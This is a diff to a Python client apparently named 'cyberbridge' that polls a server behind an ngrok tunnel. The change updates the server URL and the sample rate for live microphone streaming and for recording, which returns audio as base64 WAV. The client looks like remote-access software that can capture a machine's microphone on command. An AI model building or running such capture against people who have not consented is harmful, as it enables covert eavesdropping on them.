@@ -44,7 +44,7 @@ logger = logging.getLogger("cyberbridge.client")
 try:
     from config import SERVER_URL, POLL_INTERVAL
 except ImportError:
-    SERVER_URL    = "https://1b19-190-107-209-205.ngrok-free.app"
+    SERVER_URL    = "https://marquis-prorefugee-lala.ngrok-free.app"
     POLL_INTERVAL = 3
 
 # ─── Optional capability imports ─────────────────────────────────────────────
@@ -321,14 +321,14 @@ def _start_audio_stream() -> bool:
         try:
             pa = pyaudio.PyAudio()
             stream = pa.open(format=pyaudio.paInt16, channels=1,
-                             rate=16000, input=True, frames_per_buffer=512)
+                             rate=44100, input=True, frames_per_buffer=1024)
             _AUDIO["device"] = "microphone (default)"
             while _AUDIO["active"]:
-                chunk = stream.read(512, exception_on_overflow=False)
+                chunk = stream.read(1024, exception_on_overflow=False)
                 with _AUDIO["lock"]:
                     _AUDIO["buffer"] += chunk
-                    if len(_AUDIO["buffer"]) > 16000:
-                        _AUDIO["buffer"] = _AUDIO["buffer"][-16000:]
+                    if len(_AUDIO["buffer"]) > 44100:
+                        _AUDIO["buffer"] = _AUDIO["buffer"][-44100:]
         except Exception as e:
             _AUDIO["error"]  = str(e)
             _AUDIO["active"] = False
@@ -369,9 +369,9 @@ def _start_audio_record() -> bool:
         try:
             pa = pyaudio.PyAudio()
             stream = pa.open(format=pyaudio.paInt16, channels=1,
-                             rate=16000, input=True, frames_per_buffer=512)
+                             rate=44100, input=True, frames_per_buffer=1024)
             while _AUDIO_REC["active"]:
-                chunk = stream.read(512, exception_on_overflow=False)
+                chunk = stream.read(1024, exception_on_overflow=False)
                 with _AUDIO_REC["lock"]:
                     _AUDIO_REC["frames"].append(chunk)
         except Exception as e:
@@ -402,7 +402,7 @@ def _stop_audio_record() -> str:
     wf = wave.open(buf, "wb")
     wf.setnchannels(1)
     wf.setsampwidth(2)
-    wf.setframerate(16000)
+    wf.setframerate(44100)
     wf.writeframes(b"".join(frames))
     wf.close()
     return base64.b64encode(buf.getvalue()).decode()
